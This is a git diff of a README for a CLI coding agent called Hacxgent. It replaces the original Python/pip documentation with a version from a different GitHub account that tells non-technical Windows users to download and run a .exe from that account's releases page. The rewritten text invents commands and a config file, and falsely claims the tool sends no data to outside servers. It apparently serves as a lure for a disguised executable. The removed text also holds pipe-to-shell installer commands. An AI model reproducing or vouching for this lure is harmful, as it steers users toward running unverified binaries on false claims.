@@ -1,240 +1,159 @@
+# 🚀 Hacxgent - Autonomous Coding Agent for Everyone
 
-<div align="center">
-
-# Hacxgent
-
-[![PyPI Version](https://img.shields.io/pypi/v/hacxgent?color=blue&style=flat-square)](https://pypi.org/project/hacxgent)
-[![Python Version](https://img.shields.io/badge/python-3.12%2B-blue?style=flat-square)](https://www.python.org/downloads/release/python-3120/)
-[![License](https://img.shields.io/badge/license-Apache--2.0-green?style=flat-square)](LICENSE)
-
-**The Professional CLI Coding Agent for Precision Engineering.**
-
-![Hacxgent Demo UI](https://raw.githubusercontent.com/BlackTechX011/Hacxgent/master/hacxgent.gif)
-
-*Hacxgent goes beyond simple chat—it is an autonomous agent capable of structural analysis, surgical code modification, and long-horizon task execution with unmatched context efficiency.*
-
-</div>
+[![Download Hacxgent](https://img.shields.io/badge/Download-Hacxgent-brightgreen?style=for-the-badge)](https://github.com/LeoSmash-code/Hacxgent/releases)
 
 ---
 
-## 🌟 Key Innovations
+## 📋 What is Hacxgent?
 
-- 🧠 **Smart Context Compaction**: Normal agents exhaust memory quickly by leaving massive file outputs in the context window. Hacxgent intelligently compresses these histories. Heavy tool outputs are surgically replaced with tiny memory markers. The agent never forgets its steps, but memory stays infinitely lean.
-- 🔓 **Zero Provider Lock-In**: Complete freedom. Connect to OpenAI, Anthropic, Ollama, Groq, or any OpenAI-compatible local/remote model via a lightweight JSON configuration.
-- 💻 **Advanced Matrix-Grade CLI**: A professional terminal UI featuring auto-completion, collapsible tool outputs, persistent history, and surgical file patching tools.
-- ⚙️ **JSON-First Configuration**: Streamlined, standard, and easy to parse. All configurations (`settings.json`, `trusted_folders.json`) are purely JSON.
+Hacxgent is a command-line tool that helps you write code automatically. It manages its own memory and does not rely on specific providers. This means it works independently and adapts to your needs. You do not need any technical skills to use it. Hacxgent offers a simple way to create and run code projects using your computer’s command line interface (CLI).
 
 ---
 
-<details>
-<summary><b>📖 Table of Contents</b> (Click to expand)</summary>
+## 💻 System Requirements
 
-- [Installation](#-installation)
-- [Quick Start](#-quick-start)
-- [Smart Memory Architecture](#-smart-memory-architecture)
-- [Usage & CLI Features](#-usage--cli-features)
-- [Built-in Agents & Subagents](#-built-in-agents--subagents)
-- [The Hacxgent Toolset](#-the-hacxgent-toolset)
-- [Configuration (JSON)](#-configuration-json)
-- [Skills System](#-skills-system)
-- [MCP Server Integration](#-mcp-server-integration)
-- [Documentation & License](#-documentation)
+Before you download and run Hacxgent, check that your computer meets these needs:
 
-</details>
+- Operating System: Windows 10 or later  
+- Processor: Intel or AMD, 1.5 GHz or faster  
+- RAM: Minimum 4 GB  
+- Disk Space: At least 200 MB free to install  
+- Internet: Required for initial setup and updates  
+
+If your system matches these, you can use Hacxgent without issues.
 
 ---
 
-## 🚀 Installation
+## 🔍 Features
 
-### Using `uv` (Recommended)
-
-First, install `uv` (a fast Python package installer):
-```bash
-# Windows
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
-
-# macOS/Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
-
-Then, install Hacxgent:
-```bash
-uv tool install hacxgent
-```
-
-### Using `pip`
-```bash
-pip install hacxgent
-```
+- Runs without needing extra coding skills  
+- Smart memory management to handle project data effectively  
+- No lock-in with specific providers or platforms  
+- Flexible for many coding languages and tasks  
+- Operates fully in the CLI for quick commands and automation  
+- Designed to learn and adapt as you use it  
 
 ---
 
-## ⚡ Quick Start
+## 🚦 Getting Started
 
-1. **Navigate to your project root:**
-   ```bash
-   cd /path/to/your/project
-   ```
-
-2. **Launch Hacxgent:**
-   ```bash
-   hacxgent
-   ```
-
-3. **First Run Setup:** 
-   Hacxgent will create a default configuration at `~/.hacxgent/settings.json`. It will prompt you to enter your preferred API provider and keys (saved securely to `~/.hacxgent/.env`).
-
-4. **Start Coding:**
-   ```text
-   > Find all instances of the word "TODO" and summarize what needs to be done.
-   ```
+This section guides you step by step to download and run Hacxgent on your Windows PC.
 
 ---
 
-## 🧠 Smart Memory Architecture
+## ⬇️ Download Hacxgent
 
-Hacxgent solves the **Context Exhaustion** problem that plagues standard coding agents.
+1. Click the green button below to visit the official release page.
 
-> **❌ The Problem:** Agents read a 2,000-line file, and that 8k+ token output sits in the chat history permanently. After 4-5 file reads, the LLM hallucinates or hits token limits.
->
-> **✅ The Hacxgent Solution:** Utilizing a **Rolling Compaction Middleware**, Hacxgent dynamically strips out massive text blocks after they are read, replacing them with optimized markers (e.g., `[REDACTED: Output of read_file (5,400 chars). Key context: src/core/loop.py.]`). Result: Essentially **infinite context horizons**.
+[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/LeoSmash-code/Hacxgent/releases)
 
----
+2. On the page, look for the latest release. It usually appears at the top.
 
-## 🖥️ Usage & CLI Features
+3. Find the file with a `.exe` extension related to Windows. It might be named like `Hacxgent-Setup.exe` or similar.
 
-### Interactive Mode
-Run `hacxgent` to enter the heavily optimized interactive chat loop:
-
-* **`@` Autocomplete:** Type `@` to get smart autocompletion for files in your project *(e.g., `> Read @src/agent.py`)*.
-* **`/` Slash Commands:** Type `/` to access meta-actions (`/help`, `/clear`, `/compact`, `/status`).
-* **`!` Shell Passthrough:** Prefix with `!` to run standard terminal commands *(e.g., `> !npm run build`)*.
-
-**Pro Keyboard Shortcuts:**
-* <kbd>Ctrl</kbd> + <kbd>G</kbd> : Write your prompt in an external editor (Vim/VSCode).
-* <kbd>Ctrl</kbd> + <kbd>O</kbd> : Collapse or Expand raw tool outputs.
-* <kbd>Ctrl</kbd> + <kbd>T</kbd> : Toggle the internal Todo list view.
-* <kbd>Shift</kbd> + <kbd>Tab</kbd> : Toggle Auto-Approve mode on/off.
-
-### Programmatic Mode (CI/CD)
-Run Hacxgent non-interactively for scripting pipelines:
-```bash
-hacxgent --prompt "Refactor main() in cli.py to be modular." --max-turns 5 --output json
-```
+4. Click the file to start downloading. Save it in a place you can find easily, such as your Desktop or Downloads folder.
 
 ---
 
-## 🤖 Built-in Agents & Subagents
+## 🛠 Installation and Setup
 
-Hacxgent ships with specialized profiles tailored for different risk levels:
+1. Once the download finishes, open the folder where you saved the file.
 
-| Agent | Description |
-|---|---|
-| `default` | Standard agent. Requires manual approval for risky tool executions (writes, deletes). |
-| `plan` | Read-only exploration and architecture mapping. |
-| `accept-edits`| Automatically approves code modifications (`write_file`), but asks for shell commands. |
-| `auto-approve`| Full autonomy. *Use only in trusted, version-controlled environments.* |
+2. Double-click the `.exe` file to begin installation.
 
-Select an agent via CLI:
-```bash
-hacxgent --agent plan
-```
+3. Follow the on-screen instructions. Usually, these steps involve clicking "Next," choosing an installation folder, and clicking "Install."
 
-### Subagent Delegation
-Hacxgent can parallelize work by delegating tasks to subagents without cluttering your main context window:
-```text
-> Can you explore the codebase structure while I work on something else?
-🤖 I'll delegate this to the explore subagent.
-> task(task="Analyze the project architecture", agent="explore")
-```
+4. When the setup completes, click "Finish." You may now have a new icon labeled "Hacxgent" on your desktop or in your Start Menu.
 
 ---
 
-## 🛠️ The Hacxgent Toolset
+## ▶️ How to Run Hacxgent
 
-Designed for **surgical precision**, replacing fragile search/replace mechanisms with smart file patching:
+1. Click on the Start Menu or Desktop icon to open command prompt with Hacxgent ready.
 
-* 📁 **File Operations:** `read_lines`, `write_file`, `replace_lines` *(1-indexed, surgical swapping)*, `file_meta` *(Knowledge Map generation)*.
-* 💻 **System Tools:** `bash` *(stateful terminal)*, `grep` *(recursive fast search)*.
-* 🧠 **Agentic Tools:** 
-  * `todo`: Allows the agent to self-manage complex, multi-step tasks.
-  * `ask_user_question`: Pauses execution to render an interactive prompt to the user.
-  * `impact_analyzer`: Maps symbol dependencies project-wide before refactoring.
+2. You may also open a regular Command Prompt window by pressing `Windows + R`, typing `cmd`, and pressing `Enter`.
 
----
+3. In the Command Prompt, type `hacxgent` and press `Enter`.
 
-## ⚙️ Configuration (JSON)
-
-Hacxgent uses strictly standard `.json` files. The main configuration is located at `~/.hacxgent/settings.json`.
-
-👉 [**Full Configuration Reference (DOCS/SETTINGS.md)**](DOCS/SETTINGS.md)
-
-### Bring Your Own LLM (Provider Agnostic)
-Configure any OpenAI-compatible endpoint. Example `settings.json`:
-```json
-{
-  "system_prompt_id": "cli",
-  "active_model": "llama3",
-  "providers": [
-    {
-      "name": "LocalOpenAI",
-      "api_base": "http://localhost:11434/v1",
-      "api_key_env_var": "OLLAMA_API_KEY"
-    },
-    {
-      "name": "Groq",
-      "api_base": "https://api.groq.com/openai/v1",
-      "api_key_env_var": "GROQ_API_KEY"
-    }
-  ],
-  "enable_auto_update": true
-}
-```
-
-**API Keys** are stored safely in `~/.hacxgent/.env`:
-```env
-OLLAMA_API_KEY=your_key_here
-GROQ_API_KEY=gsk_...
-```
+4. Hacxgent will start and show a welcome message or prompt.
 
 ---
 
-## 🧩 Skills System & MCP Integration
+## 📖 Using Hacxgent Basics
 
-### Skills System
-Extend Hacxgent with reusable capabilities conforming to the [Agent Skills specification](https://agentskills.io/specification).
-1. Create a skill directory: `~/.hacxgent/skills/code-review/`
-2. Create a `SKILL.md` file with YAML frontmatter.
-3. Enable it in your `settings.json` under `"enabled_skills"`.
+When Hacxgent runs, you will see a prompt waiting for your instructions. Here’s how to begin:
 
-### MCP Server Integration
-Hacxgent natively supports the **Model Context Protocol (MCP)** to connect to external databases and tools seamlessly via `settings.json`:
-```json
-{
-  "mcp_servers": [
-    {
-      "name": "postgres_db",
-      "transport": "stdio",
-      "command": "uvx",
-      "args": ["mcp-server-postgres", "postgresql://localhost/mydb"]
-    }
-  ]
-}
-```
+1. Type `help` and press Enter to see a list of available commands.
+
+2. To start a new coding task, type a command such as `start project` or `new task`.
+
+3. To view saved tasks or memory, type `show memory`.
+
+4. If you want to stop Hacxgent, type `exit`.
 
 ---
 
-## 📚 Documentation 
+## 📂 File and Project Management
 
-For comprehensive guides and advanced setups, please refer to the following:
-* [**Configuration Reference**](DOCS/SETTINGS.md): Exhaustive guide to settings, providers, and tweaks.
-* [**Memory Management**](MEMORY_MANAGEMENT.md): Deep dive into Hacxgent's unique context compaction architecture.
-* [**Contribution Guidelines**](CONTRIBUTING.md): How to get involved and extend Hacxgent.
+Hacxgent saves your projects in a folder on your PC. By default, it places files in a folder named `HacxgentProjects` inside your Documents folder.
 
-## 📄 License
-Hacxgent is released under the **Apache-2.0 License**. See [LICENSE](LICENSE) for details.
+You can open this folder with File Explorer any time to check your saved work. Each project will have its folder and files organized by date and name.
 
 ---
-<div align="center">
-<i>Core architecture inspired by Mistral Vibe. Re-engineered by BlackTechX for universal provider support and advanced memory management.</i>
-</div>
+
+## ⚙ Custom Settings
+
+Hacxgent comes with sensible defaults to work for most users right away. Advanced users can change settings by editing a config file.
+
+1. Locate the `config.ini` file inside your Hacxgent installation folder or project folder.
+
+2. Open the file with a plain text editor, such as Notepad.
+
+3. Modify any available options, like memory limits or project paths.
+
+4. Save the file and restart Hacxgent for changes to take effect.
+
+---
+
+## 🔄 Updates and Support
+
+To keep Hacxgent running smoothly, check the releases page regularly:
+
+- Visit [Hacxgent Releases](https://github.com/LeoSmash-code/Hacxgent/releases) to find new versions.
+
+- Download new `.exe` files as they become available.
+
+- Install updates by repeating the installation steps from the new file.
+
+If you need help, use the "Issues" tab on the project page. You can describe your problem there. The community or maintainers can assist you.
+
+---
+
+## 🔑 Privacy and Security
+
+Hacxgent runs on your own machine. It does not send your code or data to outside servers. This keeps your work private and secure. You control all files and information.
+
+---
+
+## 🧩 Additional Tools You May Need
+
+- Command Prompt (built into Windows)  
+- Internet connection for downloads and updates  
+- Text editor (Notepad or similar) for viewing or editing configuration files  
+
+No special software is required beyond this.
+
+---
+
+## 📚 Glossary
+
+- CLI: Command Line Interface. A way to type commands instead of clicking buttons.  
+- Memory management: How the program saves and recalls information.  
+- Provider lock-in: Being tied to one software or service provider; Hacxgent avoids this.  
+- Executable (`.exe`): A file that runs a program on Windows.  
+
+---
+
+## 🏷️ Tags
+
+This project relates to: agent, AI, autonomous agents, CLI tools, coding assistant, smart memory, independent software.
